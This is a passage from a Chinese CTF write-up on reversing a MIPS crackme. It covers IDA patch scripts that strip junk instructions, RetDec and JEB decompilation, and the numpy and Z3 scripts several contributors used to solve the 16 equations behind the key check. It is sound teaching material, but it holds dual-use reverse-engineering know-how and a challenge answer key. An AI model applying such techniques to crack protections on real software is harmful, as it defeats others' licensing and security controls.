4</span><br></pre></td></tr></table></figure><hr><p>选择上述其中一个脚本，在桌面保存成一个.py或.idc文件<br>选择File-&gt;Script file或Script command</p><p><img src="https://i.loli.net/2018/07/16/5b4c617b7d80a.jpg" alt="mark"></p><p>然后import导入或直接写也可以，然后RUN<br><img src="https://i.loli.net/2018/07/16/5b4c617b906bc.jpg" alt="mark"></p><p>关闭这个窗口，会有一个提示是否保存修改，点击Yes，这时桌面会生成一个patch<br><img src="https://i.loli.net/2018/07/16/5b4c617ba424b.jpg" alt="mark"></p><p>IDA载入这个patch，可以发现在ubuntu下的IDA里指令都可以被识别，而且可以运行，我在win10运行的IDA会有几个小段不能识别，需要手动改为指令，将0x400420处的代码转换成函数</p><h3 id="将数据转为代码和函数"><a href="#将数据转为代码和函数" class="headerlink" title="将数据转为代码和函数"></a>将数据转为代码和函数</h3><p>首先往下看看，有几段没有识别的<br><img src="https://i.loli.net/2018/07/16/5b4c617bb9aa6.jpg" alt="mark"><br>把它们全部选中(00401A58-00401F28)，右键,选择Analyze selected area或按C，<br><img src="https://i.loli.net/2018/07/16/5b4c617bce1a2.jpg" alt="mark"><br>选Analyze，然后Yes，然后就会变成代码<br><img src="https://i.loli.net/2018/07/16/5b4c618e6b9a9.jpg" alt="mark"><br>当然这还没完，函数头部00400420没有变量声明，识别出来的肯定是错误的函数，因此在00400420右键，选择Create function<br><img src="https://i.loli.net/2018/07/16/5b4c618e978db.jpg" alt="mark"><br>就可以了<br>然后图形化分析就像下面那样</p><p><strong>记得保存修改，路径Edit-&gt;Patch program-&gt;Apply patches input file</strong></p><blockquote><p><strong>标准转换方式</strong></p><p>1.<em>函数和数据互换</em></p><p>在重新格式化之前，首先必须删除其当前的格式（代码或数据）。右击你希望取消定义的项目，在结果上下文菜单中选择Undefine（也可使用Edit▶Undefine命令或热键U），即可取消函数、代码或数据的定义</p><p>转换成code后，此时不能使用图形view<br>创建函数（Edit—&gt;Functions—&gt;Create Function….）就可以了</p><p>2.<em>代码和数据转换</em></p><p>通过Edit▶Data和热键D来完成,之后使用Undefine<br>之后使用code指令</p></blockquote><h3 id="算法分析"><a href="#算法分析" class="headerlink" title="算法分析"></a>算法分析</h3><h4 id="1-反编译器分析"><a href="#1-反编译器分析" class="headerlink" title="1.反编译器分析"></a>1.反编译器分析</h4><p>用图形化分析sub_400420这个函数<br><img src="https://i.loli.net/2018/07/16/5b4c618eac743.jpg" alt="mark"><br>一共十六个条件，必须每条都得满足才行</p><p>IDA的F5不能用，我们需要能够分析MIPS的反编译器<br>· <strong>Retdec</strong>     <a href="https://github.com/avast-tl/retdec" target="_blank" rel="noopener">https://github.com/avast-tl/retdec</a><br>· <strong>JEB-MIPS</strong>   <a href="https://www.pnfsoftware.com/jeb/demomips" target="_blank" rel="noopener">https://www.pnfsoftware.com/jeb/demomips</a></p><p>下面是三种找出算法的方法</p><h5 id="1-Retdec"><a href="#1-Retdec" class="headerlink" title="1.Retdec"></a>1.Retdec</h5><p>RetDec 是一个可重定向的机器码反编译器，它基于 LLVM，支持各种体系结构、操作系统和文件格式：<br>支持的文件格式：ELF，PE，Mach-O，COFF，AR（存档），Intel HEX 和原始机器码。<br>支持的体系结构（仅限 32 位）：Intel x86，ARM，MIPS，PIC32 和 PowerPC。</p><p>安装和使用方法GitHub上都写了<br>或者这里有一个很好的简易介绍  <a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/5.11.1_retdec.html" target="_blank" rel="noopener">https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/5.11.1_retdec.html</a></p><p>我在win10安装之后，把patch放到了D盘根目录，Retdec文件夹也是，然后在cmd中执行<br><code>D:\retdec\bin\decompile.sh D:\patch</code><br>等待分析(因为我装了Git，就自动调用Git bash执行了，其他情况还没试过)<br>结束后D盘生成下面几个文件<br><img src="https://i.loli.net/2018/07/16/5b4c618ec9bd3.jpg" alt="mark"><br>打开patch.c，看sub_400420<br>我的不知道出了什么问题，分析不了，直接return 1。。。感觉应该是把函数分解了</p><p><img src="https://i.loli.net/2018/07/16/5b4c618ee2755.jpg" alt="mark"></p><p>借用一下‘niuwuwu’的图<br><img src="https://i.loli.net/2018/07/16/5b4c618f05c61.jpg" alt="mark"></p><p>是16个方程求解，解方程下面说，接下来用JEB反编译</p><h5 id="2-JEB-MIPS"><a href="#2-JEB-MIPS" class="headerlink" title="2.JEB-MIPS"></a>2.JEB-MIPS</h5><p>先到官网下载试用版的JEB，试用版功能是完整版的百分之九十，所以其实足够学习用了(国外友人客服也非常专业且友好)</p><p>解压后有三个运行脚本，分别是Windows，Linux和Mac OS的，我为了方便就装Ubuntu了</p><p><strong>不管是哪个系统，我们都需要JAVA8的环境</strong></p><p>Ubuntu安装JAVA8<br><code>sudo apt-get install openjdk-8-jdk</code><br>查看java版本，看看是否安装成功<br><code>java -version</code></p><p>成功后运行脚本，就打开主程序了，导入patch程序，找到00400420<br><img src="https://i.loli.net/2018/07/16/5b4c618f29f4e.jpg" alt="mark"><br>右键，Decompile<br><img src="https://i.loli.net/2018/07/16/5b4c618f4427c.jpg" alt="mark"><br>很长很长的算式，就是16个方程了</p><h4 id="2-手工分析清洗方程"><a href="#2-手工分析清洗方程" class="headerlink" title="2.手工分析清洗方程"></a>2.手工分析清洗方程</h4><p>(来自‘奈沙夜影’)</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f = open(&quot;code.txt&quot;, &quot;r&quot;)</span><br><span class="line">flower = [&quot;slti&quot;, &quot;sdc1&quot;]</span><br><span class="line">a0 = 0x76ff270</span><br><span class="line">v0 = 0xd0000</span><br><span class="line">v1 = 8</span><br><span class="line">fp = [0 for i in range(0x500)]</span><br><span class="line">table = [0x0, 0x42d1f0, 0x0, 0x42d1f0,</span><br><span class="line">0xa, 0xa, 0x0, 0x9,</span><br><span class="line">0x4250bc, 0x9, 0x426630, 0x42d1f0,</span><br><span class="line">0x40a3ec, 0x37343431, 0x363434, 0x0,</span><br><span class="line">0x0, 0x42d1f0, 0x0, 0x4250bc,</span><br><span class="line">0x0, 0x0, 0x425060, 0x42d1f0,</span><br><span class="line">0x403ad0, 0x0, 0x0, 0x1000,</span><br><span class="line">0x425088, 0x76fff184, 0x412fcd, 0x1,</span><br><span class="line">0x410570, 0x425190, 0x40ca48, 0x0,</span><br><span class="line">0x0, 0x42d1f0, 0x0, 0x42d1f0,</span><br><span class="line">0x425088, 0xffffffff, 0x4106c4, 0xffffffff,</span><br><span class="line">0x76fff184, 0x412fcd, 0x1, 0x42d1f0,</span><br><span class="line">0x0, 0x425088, 0x40ccac, 0x0,</span><br><span class="line">0x0, 0x0, 0x0, 0x42d1f0,</span><br><span class="line">0x0, 0x425190, 0x76ffeef8, 0x425190,</span><br><span class="line">0x10, 0x425088, 0x40baac, 0x42d1f0,</span><br><span class="line">0x412fcd, 0x1, 0x425088, 0x40baac,</span><br><span class="line">0x76fff184, 0x412fce, 0x40b684, 0x0,</span><br><span class="line">0x0, 0x0, 0x0, 0x42d1f0,</span><br><span class="line">0x0, 0x0, 0x0, 0x0,</span><br><span class="line">0x0, 0x0, 0x0, 0x0,</span><br><span class="line">0x0, 0x42d1f0, 0x0, 0x42d1f0,</span><br><span class="line">0x0, 0x4250bc, 0x413081, 0x9,</span><br><span class="line">0x403f24, 0x0, 0x0, 0x0,</span><br><span class="line">0x0, 0x0, 0x0, 0x42d1f0,</span><br><span class="line">0x0, 0x413078, 0x0, 0x0,</span><br><span class="line">0x0, 0x0, 0xd0000, 0xf1f4,</span><br><span class="line">0xcf8, 0xf5f1, 0x7883, 0xe2c6,</span><br><span class="line">0x67, 0xeccc, 0xc630, 0xba2e,</span><br><span class="line">0x6e41, 0x641d, 0x716d, 0x4505,</span><br><span class="line">0x76fff224, 0x0, 0x0, 0x0,</span><br><span class="line">0x0, 0x0, 0x0, 0x0,</span><br><span class="line">0x0, 0x0, 0x0, 0x0,</span><br><span class="line">0x0, 0x0, 0x0, 0x0,</span><br><span class="line">0x0, 0x0, 0x0, 0x0,</span><br><span class="line">0x0, 0x0, 0x0, 0x0,</span><br><span class="line">0x0, 0x0, 0x0, 0x0,</span><br><span class="line">0x0, 0x0, 0xfffffffe, 0x0,</span><br><span class="line">0x76fff2ac, 0x412fcd, 0x1, 0x0,</span><br><span class="line">0x6, 0x7fffffff, 0x1, 0x0,</span><br><span class="line">0x0, 0x0, 0x0, 0x0,</span><br><span class="line">0x0, 0x0, 0x0, 0x0,</span><br><span class="line">0x0, 0x0, 0x0, 0x0,</span><br><span class="line">0x0, 0x0, 0x0, 0x0,</span><br><span class="line">0xa, 0xa, 0x425088, 0x8,</span><br><span class="line">0x7ffffff8, 0x100, 0x413f38, 0x1,</span><br><span class="line">0x413f38, 0x0, 0x2, 0x76fff0f8,</span><br><span class="line">0x0, 0x0, 0x7fffffff, 0x76fff220,</span><br><span class="line">0x405050, 0x550001, 0x0, 0x425000,</span><br><span class="line">0x0, 0x0, 0x0, 0x0,</span><br><span class="line">0x0, 0x0, 0x0, 0x76fff220,</span><br><span class="line">0x404d84, 0x42d1f0, 0x0, 0x500,</span><br><span class="line">0x5, 0x42d1f0, 0xb3b, 0x76fff224,</span><br><span class="line">0x115, 0x1a131100, 0x76fff220, 0x76fff270,</span><br><span class="line">0x76fff2ac, 0xffbecf88, 0xa, 0x405880]</span><br><span class="line">j = 0</span><br><span class="line">functions = 0</span><br><span class="line">for i in range(0xb4, 0x410, 4):</span><br><span class="line">    fp[i] = table[j]</span><br><span class="line">    j += 1</span><br><span class="line">input = [int(str(i)*3, 16) for i in range(16)]</span><br><span class="line">try:</span><br><span class="line">    while(True):</span><br><span class="line">        code = f.readline()</span><br><span class="line">        if(code == &quot;&quot;):</span><br><span class="line">            print(&quot;finish&quot;)</span><br><span class="line">            break</span><br><span class="line">        if(code[:3] == &quot;loc&quot;):</span><br><span class="line">            # print(&quot;\n[s]:\t&quot; + code[:-1])</span><br><span class="line">            continue</span><br><span class="line">        if(code.find(&quot;nop&quot;)!=-1):</span><br><span class="line">            continue</span><br><span class="line">        code = code.split(&quot;$&quot;)</span><br><span class="line">        # print(code)</span><br><span class="line"></span><br><span class="line">        c = code[0].strip()</span><br><span class="line"></span><br><span class="line">        if(c==&quot;sw&quot;):</span><br><span class="line">            n1 = code[1].split(&quot;,&quot;)[0]</span><br><span class="line">            n2 = 0x410 - int(&quot;0x&quot; + code[1].split(&quot;_&quot;)[1].split(&quot;(&quot;)[0], 16)</span><br><span class="line">            code = (&quot;fp[&quot; + hex(n2) + &quot;] = &quot; + n1)</span><br><span class="line">        elif(c==&quot;li&quot;):</span><br><span class="line">            n1 = code[1].split(&quot;,&quot;)[0]</span><br><span class="line">            n2 = code[1].split(&quot;,&quot;)[1].strip()</span><br><span class="line">            code = (n1 + &quot; = &quot; + n2)</span><br><span class="line">        elif(c==&quot;lw&quot;):</span><br><span class="line">            n1 = code[1].split(&quot;,&quot;)[0]</span><br><span class="line">            if(&quot;&quot;.join(code).find(&quot;fp&quot;)!=-1):</span><br><span class="line">                n2 = 0x410 - int(&quot;0x&quot; + code[1].split(&quot;_&quot;)[1].split(&quot;(&quot;)[0], 16)</span><br><span class="line">                code = (n1 + &quot; = fp[&quot; + hex(n2) + &quot;]&quot;)</span><br><span class="line">                # print(&quot;# &quot; + hex(fp[n2]))</span><br><span class="line">                #输出方程</span><br><span class="line">                print(&quot;0x%x*&quot;%fp[n2],end=&apos;&apos;)</span><br><span class="line">            else:</span><br><span class="line">                # print(&quot;[c]:\t&quot; + &quot;&quot;.join(code)[:-1], &quot;v0=%x&quot;%v0)</span><br><span class="line">                n2 = ((v0) + int(code[1].split(&quot;,&quot;)[1].replace(&quot;(&quot;, &quot;&quot;)))//4</span><br><span class="line">                code = (n1 + &quot; = input[&quot; + str(n2) + &quot;]&quot;)</span><br><span class="line">                print(&quot;a[%d]&quot;%n2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                # print(code)</span><br><span class="line">                # print(hex(v0))</span><br><span class="line">                # break</span><br><span class="line">        elif(c==&quot;sll&quot;):</span><br><span class="line">            n1 = code[1].split(&quot;,&quot;)[0]</span><br><span class="line">            n2 = code[1].split(&quot;,&quot;)[1].strip()</span><br><span class="line">            code = (n1 + &quot; = &quot; + n1 + &quot;&lt;&lt;&quot; + n2)</span><br><span class="line">        elif(c==&quot;sra&quot;):</span><br><span class="line">            n1 = code[1].split(&quot;,&quot;)[0]</span><br><span class="line">            n2 = code[1].split(&quot;,&quot;)[1].strip()</span><br><span class="line">            code = (n1 + &quot; = &quot; + n1 + &quot;&gt;&gt;&quot; + n2)</span><br><span class="line">        elif(c==&quot;xori&quot;):</span><br><span class="line">            n1 = code[1].split(&quot;,&quot;)[0]</span><br><span class="line">            n2 = code[1].split(&quot;,&quot;)[1].strip()</span><br><span class="line">            code = (n1 + &quot; = &quot; + n1 + &quot;^&quot; + n2)</span><br><span class="line">        elif(c==&quot;addiu&quot;):</span><br><span class="line">            n1 = code[1].split(&quot;,&quot;)[0]</span><br><span class="line">            n2 = code[1].split(&quot;,&quot;)[1].strip()</span><br><span class="line">            code = (n1 + &quot; = &quot; + n1 + &quot;+&quot; + n2)</span><br><span class="line">            # print(&quot;+&quot;)</span><br><span class="line">        elif(c==&quot;mul&quot;):</span><br><span class="line">            n1 = code[1].split(&quot;,&quot;)[0]</span><br><span class="line">            n2 = code[2].split(&quot;,&quot;)[0].strip()</span><br><span class="line">            n3 = code[3].strip()</span><br><span class="line">            code = (n1 + &quot; = &quot; + n2 + &quot;*&quot; + n3)</span><br><span class="line">        elif(c==&quot;addu&quot;):</span><br><span class="line">            n1 = code[1].split(&quot;,&quot;)[0]</span><br><span class="line">            n2 = code[2].split(&quot;,&quot;)[0].strip()</span><br><span class="line">            code = (n1 + &quot; = &quot; + n1 + &quot;+&quot; + n2)</span><br><span class="line">            print(&quot;+&quot;)</span><br><span class="line">        elif(c==&quot;subu&quot;):</span><br><span class="line">            n1 = code[1].split(&quot;,&quot;)[0]</span><br><span class="line">            n2 = code[2].split(&quot;,&quot;)[0].strip()</span><br><span class="line">            code = (n1 + &quot; = &quot; + n1 + &quot;-&quot; + n2)</span><br><span class="line">            print(&quot;-&quot;)</span><br><span class="line">        elif(c==&quot;beq&quot;):</span><br><span class="line">            print(&quot;=0x%x&quot;%(v0))</span><br><span class="line">            print(&quot;================================================one function=====================================&quot;)</span><br><span class="line">            functions +=1</span><br><span class="line">            continue</span><br><span class="line">        elif(c==&quot;negu&quot;):</span><br><span class="line">            n1 = code[1].split(&quot;,&quot;)[0]</span><br><span class="line">            n2 = code[2].split(&quot;,&quot;)[0].strip()</span><br><span class="line">            code = (n1 + &quot; = &quot; + &quot;-&quot; + n2)</span><br><span class="line">            print(&quot;-&quot;)</span><br><span class="line">        elif(c==&quot;nop&quot;):</span><br><span class="line">            continue</span><br><span class="line">        elif(c==&quot;lui&quot;):</span><br><span class="line">            n1 = code[1].split(&quot;,&quot;)[0]</span><br><span class="line">            n2 = code[1].split(&quot;,&quot;)[1].strip()</span><br><span class="line">            code = (n1 + &quot; = &quot; + n2 + &quot;&lt;&lt;32&quot;)</span><br><span class="line">        elif(c==&quot;move&quot; or c==&quot;and&quot;):</span><br><span class="line">            continue</span><br><span class="line">        elif(c in flower):</span><br><span class="line">            # print(&quot;[f]:\t&quot; + &quot;&quot;.join(code)[:-1])</span><br><span class="line">            continue</span><br><span class="line"></span><br><span class="line">        else:</span><br><span class="line">            print(&quot;[x]:\tFind unknown code | &quot; + &quot;&quot;.join(code))</span><br><span class="line">            break</span><br><span class="line">        # print(&quot;[-]:\t&quot; + code)</span><br><span class="line">        exec(code)</span><br><span class="line">except Exception as e:</span><br><span class="line">    print(repr(e))</span><br><span class="line">    print(code)</span><br><span class="line">print(functions)</span><br><span class="line"># print(fp)</span><br></pre></td></tr></table></figure><h3 id="解方程"><a href="#解方程" class="headerlink" title="解方程"></a>解方程</h3><p>解方程的方法很多<br>比如Python的有</p><blockquote><p>Numpy 求解线性方程组<br>SciPy 求解非线性方程组<br>SymPy</p></blockquote><p>上面三个有个链接可以参照<a href="https://zhuanlan.zhihu.com/p/24893371" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/24893371</a></p><h4 id="numpy求解"><a href="#numpy求解" class="headerlink" title="numpy求解"></a>numpy求解</h4><p>来自‘niuwuwu’</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line">from scipy.linalg import solve</span><br><span class="line">A=[</span><br><span class="line">    [-56251,64497,-61787,29993,-16853,2147,-51990,-36278,-34108,-1148,1798,-43452,-16150,-56087,-17677,-41752],</span><br><span class="line">    [-39354,63754,50513,2396,-37448,43585,19468,-4688,-62869,-20663,41173,61113,30862,38224,-601,53899],</span><br><span class="line">    [26798,-58888,14929,-21751,-12385,55961,-20714,24897,40045,9805,25147,39173,-21952,-42840,37937,-8559],</span><br><span class="line">    [-2789,53359,16747,54195,-30020,39916,-32582,60338,13971,27307,-30484,47826,37554,64914,-1745,27669],</span><br><span class="line">    [40374,6523,13380,-53413,-1194,7796,-31815,-51866,-40252,-56883,57811,23278,-5785,61525,-6984,-7335],</span><br><span class="line">    [-57052,-64573,-62351,2628,21493,12939,-60006,435,15009,-4091,22743,4901,48803,-43203,5263,-32994],</span><br><span class="line">    [54760,41053,22537,-56473,46316,19787,-40180,2088,2044,26575,-5207,31098,-23838,21642,46750,13706],</span><br><span class="line">    [-40176,-43382,48718,-25423,21452,-36714,-24119,-13231,-52192,49742,54709,-32636,20233,21460,48733,15155],</span><br><span class="line">    [38446,-880,-2443,50487,-46973,-56178,-37138,-9079,-19096,-60988,-1823,-21538,43896,-4141,-19370,-47796],</span><br><span class="line">    [5176,18400,-53852,36119,-32120,47724,17154,5390,-29717,14471,8755,1432,-45518,-8148,-56623,-48254],</span><br><span class="line">    [30203,-50712,-27560,-16075,3618,590,44305,20581,33442,-7743,-43075,-16234,45723,-44899,42321,49264],</span><br><span class="line">    [42705,-32299,-19156,5594,28870,8059,58103,-60723,-32112,-7128,45985,-24915,63910,18427,-51408,22619],</span><br><span class="line">    [-57517,20738,-32286,55995,26666,37550,-51489,13733,32455,-2897,-39622,-54523,50733,-24649,-17849,-62326],</span><br><span class="line">    [-15716,-38264,64476,-37524,-61551,13536,12920,1407,-63767,-55105,-46543,-36562,-20712,2063,-6668,9074],</span><br><span class="line">    [47490,18611,52416,3107,32177,-41780,11008,7223,5652,881,26719,-28444,46077,-272,-32475,-9432],</span><br><span class="line">    [-58938,-35689,35708,44689,45902,36614,38550,731,49990,6727,61526,-35587,-39199,-43886,-56409,-25519],</span><br><span class="line">]</span><br><span class="line">B=[-24232262,17175305,8705731,26962228,-6384428,-15459013,19554563,-188243,-19590071,-12754495,6442406,-2869966,-4805280,-18964176,8938201,3896470]</span><br><span class="line"></span><br><span class="line">a = np.array(A)</span><br><span class="line">b = np.array(B)</span><br><span class="line">x =solve(a,b)</span><br><span class="line">print(x)</span><br></pre></td></tr></table></figure><hr><p>来自‘ljt1000’</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line"></span><br><span class="line">A  = &quot;-15858,-48466,32599,38605,-44159,23939,45662,9287,47754,47937,41896,51986,-26968,22561,30701,63487;&quot;</span><br><span class="line">A += &quot;60228,-3993,-16615,57134,-19246,-38581,40294,-44968,-28198,-58965,-39534,22458,-8828,48593,46135,23871;&quot;</span><br><span class="line">A += &quot;59121,42162,-65140,-3847,-23842,-47173,-39252,37804,-20964,-19217,56467,5112,9324,61729,61599,3578;&quot;</span><br><span class="line">A += &quot;-36731,-26147,1670,19245,26847,39911,8628,57946,-51207,63125,-21537,-9321,40745,-58129,30962,-27610;&quot;</span><br><span class="line">A += &quot;-63560,-53320,-34289,61060,-14289,46922,53218,36638,-61969,-33727,-4681,32423,-17044,-46689,-35443,-24156;&quot;</span><br><span class="line">A += &quot;-10571,-11103,51585,-24771,63730,57047,-63227,4227,-56470,-22654,-46325,62842,22480,59412,24937,62085;&quot;</span><br><span class="line">A += &quot;52617,-54333,61495,33704,-41733,-44527,51882,-61765,-24691,-10103,31055,61454,-59349,9812,-48848,-47279;&quot;</span><br><span class="line">A += &quot;-40696,-26470,54670,-23715,10008,7723,-62622,53112,31753,-5047,-48878,-58448,19875,-34944,-22161,35800;&quot;</span><br><span class="line">A += &quot;-23196,-43354,-58947,3384,-2426,-60194,51907,-20177,-31882,61703,42398,-4627,45749,-29203,-11139,-41301;&quot;</span><br><span class="line">A += &quot;-37819,-10066,-48579,-62613,-28961,40001,-37989,-27875,-20264,-33616,-5998,30740,-29594,21652,5165,51797;&quot;</span><br><span class="line">A += &quot;52993,62328,4196,-55719,-1917,28075,-44831,-15799,13652,-52110,-38933,62219,40030,-23815,-19505,60128;&quot;</span><br><span class="line">A += &quot;35796,-28033,-59250,46833,39767,-22909,5585,-42334,64787,6068,60536,-54554,22189,-49945,40846,64023;&quot;</span><br><span class="line">A += &quot;-18536,-35823,4253,-63956,20175,43158,30523,28298,-29564,18809,50821,-38574,3005,33408,58281,-29452;&quot;</span><br><span class="line">A += &quot;2848,39836,46250,24950,38512,31901,-21506,-36050,44162,41717,-36605,-26097,-38073,36024,7349,19105;&quot;</span><br><span class="line">A += &quot;22525,15747,63301,42436,-26106,-22761,48830,6176,-55225,-45599,-30368,50701,5775,10902,12758,-19336;&quot;</span><br><span class="line">A += &quot;-58450,-51156,-5460,32490,-26701,27355,34100,-14902,10736,54258,-9189,-25920,48339,-61339,61403,-30542&quot;</span><br><span class="line"></span><br><span class="line">b = &quot;23261386,-1298872,13877344,9172342,-11622989,10343966,-9721165,-8286458,-7515929,-12609498,2179053,11137244,12446496,10255605,854242,1542147&quot;</span><br><span class="line"></span><br><span class="line">A = np.mat(A)</span><br><span class="line">b = np.mat(b).T</span><br><span class="line">r = np.linalg.solve(A,b)</span><br><span class="line">print r</span><br></pre></td></tr></table></figure><h4 id="Z3约束器求解方程"><a href="#Z3约束器求解方程" class="headerlink" title="Z3约束器求解方程"></a>Z3约束器求解方程</h4><p>Z3可以说很出名了<br>这里有个教程<a href="http://ericpony.github.io/z3py-tutorial/guide-examples.htm" target="_blank" rel="noopener">http://ericpony.github.io/z3py-tutorial/guide-examples.htm</a></p><p>来自‘奈沙夜影’</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line"></span><br><span class="line">a = [BitVec(&quot;a%d&quot;%i, 32) for i in range(16)]</span><br><span class="line">s = Solver()</span><br><span class="line">s.add(0xca6a*a[0] -0xd9ee*a[1] +0xc5a7*a[2] +0x19ee*a[3] +0xb223*a[4] +0x42e4*a[5] +0xc112*a[6] -0xcf45*a[7] +0x260d*a[8] +0xd78d*a[9] +0x99cb*a[10] -0x3e58*a[11] -0x97cb*a[12] +0xfba9*a[13] -0xdc28*a[14] +0x859b*a[15]  == 0xaa2ed7)</span><br><span class="line">s.add(0xf47d*a[0] +0x12d3*a[1] -0x4102*a[2] +0xcedf*a[3] -0xafcf*a[4] -0xeb20*a[5] -0x2065*a[6] +0x36d2*a[7] -0x30fc*a[8] -0x7e5c*a[9] +0xeea8*a[10] +0xd8dd*a[11] -0xae2*a[12] +0xc053*a[13] +0x5158*a[14] -0x8d42*a[15]  == 0x69d32e)</span><br><span class="line">s.add(0xffff52cf*a[0] -0x4fea*a[1] +0x2075*a[2] +0x9941*a[3] -0xbd78*a[4] +0x9e58*a[5] +0x40ad*a[6] -0x8637*a[7] -0x2e08*a[8] +0x4414*a[9] +0x2748*a[10] +0x1773*a[11] +0xe414*a[12] -0x7b19*a[13] +0x6b71*a[14] -0x3dcf*a[15]  == 0x3b89d9)</span><br><span class="line">s.add(0xffffedd7*a[0] -0x1df0*a[1] +0x8115*a[2] +0x54bd*a[3] -0xf2ba*a[4] +0xdbd*a[5] +0x1dcf*a[6] +0x272*a[7] -0x2fcc*a[8] -0x93d8*a[9] -0x6f6c*a[10] -0x98ff*a[11] +0x2148*a[12] -0x6be2*a[13] +0x2e56*a[14] -0x7bdf*a[15]  == 0xff6a5aea)</span><br><span class="line">s.add(0xffffa8c1*a[0] +0xdc78*a[1] -0x380f*a[2] +0x33c0*a[3] -0x7252*a[4] -0xe5a9*a[5] +0x7a53*a[6] -0x4082*a[7] -0x584a*a[8] +0xc8db*a[9] +0xd941*a[10] +0x6806*a[11] -0x8b97*a[12] +0x23d4*a[13] +0xac2a*a[14] +0x20ad*a[15]  == 0x953584)</span><br><span class="line">s.add(0x5bb7*a[0] -0xfdb2*a[1] +0xaaa5*a[2] -0x50a2*a[3] -0xa318*a[4] +0xbcba*a[5] -0x5e5a*a[6] +0xf650*a[7] +0x4ab6*a[8] -0x7e3a*a[9] -0x660c*a[10] +0xaed9*a[11] -0xa60f*a[12] +0xf924*a[13] -0xff1d*a[14] +0xc888*a[15]  == 0xffd31341)</span><br><span class="line">s.add(0x812d*a[0] -0x402c*a[1] +0xaa99*a[2] -0x33b*a[3] +0x311b*a[4] -0xc0d1*a[5] -0xfad*a[6] -0xc1bf*a[7] -0x1560*a[8] -0x445b*a[9] -0x9b78*a[10] +0x3b94*a[11] +0x2531*a[12] -0xfb03*a[13] +0x8*a[14] +0x8721*a[15]  == 0xff9a6b57)</span><br><span class="line">s.add(0x15c5*a[0] +0xb128*a[1] -0x957d*a[2] +0xdf80*a[3] +0xee68*a[4] -0x3483*a[5] -0x4b39*a[6] -0x3807*a[7] -0x4f77*a[8] +0x652f*a[9] -0x686f*a[10] -0x7fc1*a[11] -0x5d2b*a[12] -0xb326*a[13] -0xacde*a[14] +0x1f11*a[15]  == 0xffd6b3d3)</span><br><span class="line">s.add(0xaf37*a[0] +0x709*a[1] +0x4a95*a[2] -0xa445*a[3] -0x4c32*a[4] -0x6e5c*a[5] -0x45a6*a[6] +0xb989*a[7] +0xf5b7*a[8] +0x3980*a[9] -0x151d*a[10] +0xaf13*a[11] +0xa134*a[12] +0x67ff*a[13] +0xce*a[14] +0x79cf*a[15]  == 0xc6ea77)</span><br><span class="line">s.add(0xffff262a*a[0] +0xdf05*a[1] -0x148e*a[2] -0x4758*a[3] -0xc6b2*a[4] -0x4f94*a[5] -0xf1f4*a[6] +0xcf8*a[7] +0xf5f1*a[8] -0x7883*a[9] -0xe2c6*a[10] -0x67*a[11] +0xeccc*a[12] -0xc630*a[13] -0xba2e*a[14] -0x6e41*a[15]  == 0xff1daae5)</span><br><span class="line">s.add(0xffff9be3*a[0] -0x716d*a[1] +0x4505*a[2] -0xb99d*a[3] +0x1f00*a[4] +0x72bc*a[5] -0x7ff*a[6] +0x8945*a[7] -0xcc33*a[8] -0xab8f*a[9] +0xde9e*a[10] -0x6b69*a[11] -0x6380*a[12] +0x8cee*a[13] -0x7a60*a[14] +0xbd39*a[15]  == 0xff5be0b4)</span><br><span class="line">s.add(0x245e*a[0] +0xf2c4*a[1] -0xeb20*a[2] -0x31d8*a[3] -0xe329*a[4] +0xa35a*a[5] +0xaacb*a[6] +0xe24d*a[7] +0xeb33*a[8] +0xcb45*a[9] -0xdf3a*a[10] +0x27a1*a[11] +0xb775*a[12] +0x713e*a[13] +0x5946*a[14] +0xac8e*a[15]  == 0x144313b)</span><br><span class="line">s.add(0x157*a[0] -0x5f9c*a[1] -0xf1e6*a[2] +0x550*a[3] -0x441b*a[4] +0x9648*a[5] +0x8a8f*a[6] +0x7d23*a[7] -0xe1b2*a[8] -0x5a46*a[9] -0x5461*a[10] +0xee5f*a[11] -0x47e6*a[12] +0xa1bf*a[13] +0x6cf0*a[14] -0x746b*a[15]  == 0xffd18bd2)</span><br><span class="line">s.add(0xf81b*a[0] -0x76cb*a[1] +0x543d*a[2] -0x4a85*a[3] +0x1468*a[4] +0xd95a*a[5] +0xfbb1*a[6] +0x6275*a[7] +0x30c4*a[8] -0x9595*a[9] -0xdbff*a[10] +0x1d1d*a[11] +0xb1cf*a[12] -0xa261*a[13] +0xf38e*a[14] +0x895c*a[15]  == 0xb5cb52)</span><br><span class="line">s.add(0xffff6b97*a[0] +0xd61d*a[1] +0xe843*a[2] -0x8c64*a[3] +0xda06*a[4] +0xc5ad*a[5] +0xd02a*a[6] -0x2168*a[7] +0xa89*a[8] +0x2dd*a[9] -0x80cc*a[10] -0x9340*a[11] -0x3f07*a[12] +0x4f74*a[13] +0xb834*a[14] +0x1819*a[15]  == 0xa6014d)</span><br><span class="line">s.add(0x48ed*a[0] +0x2141*a[1] +0x33ff*a[2] +0x85a9*a[3] -0x1c88*a[4] +0xa7e6*a[5] -0xde06*a[6] +0xbaf6*a[7] +0xc30f*a[8] -0xada6*a[9] -0xa114*a[10] -0x86e9*a[11] +0x70f9*a[12] +0x7580*a[13] -0x51f8*a[14] -0x492f*a[15]  == 0x2fde7c)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(s.check()==sat):</span><br><span class="line">    c = b&apos;&apos;</span><br><span class="line">    m = s.model()</span><br><span class="line">    for i in range(16):</span><br><span class="line">        print(&quot;a[%d]=%d&quot;%(i, m[a[i]].as_long()))</span><br><span class="line">    for i in range(16):</span><br><span class="line">        print(chr(m[a[i]].as_long()&amp;0xff), end=&apos;&apos;)</span><br></pre></td></tr></table></figure><hr><p>来自‘cq674350529’</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"></span><br><span class="line">from z3 import *</span><br><span class="line"></span><br><span class="line">a = [BitVec(&apos;a%d&apos; %i, 32) for i in xrange(16)]</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">s.add(0xffffc20e*a[0]-0xbd52*a[1]+0x7f57*a[2]+0x96cd*a[3]-0xac7f*a[4] 